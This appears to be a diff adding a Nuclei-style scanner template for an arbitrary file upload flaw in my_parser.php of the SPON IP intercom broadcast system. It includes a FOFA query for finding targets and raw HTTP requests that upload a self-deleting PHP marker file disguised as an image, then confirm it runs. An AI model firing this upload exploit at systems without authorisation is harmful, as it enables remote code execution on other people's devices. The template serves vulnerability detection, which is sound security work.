@@ -1,0 +1,43 @@
+id: spon-ip-broadcast-my_parserphp-file-upload
+
+info:
+  name: "SPON IP 网络对讲广播系统 my_parser.php 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1830859634"
+      该漏洞源于目标系统中my_parser.php接口未正确验证用户提交的文件内容，攻击者可构造恶意文件通过该接口实现任意文件上传。成功利用可导致远程代码执行或系统权限突破。受影响组件为SPON IP网络对讲广播系统，可通过指定fofa语法进行资产测绘。
+  tags: SPON
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /upload/my_parser.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------402880817133959846752911683338
+    Connection: close
+
+    -----------------------------402880817133959846752911683338
+    Content-Disposition: form-data; name="upload"; filename="NTest.php"
+    Content-Type: image/jpg
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    -----------------------------402880817133959846752911683338--
+- raw:
+  - |
+    GET /upload/files/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
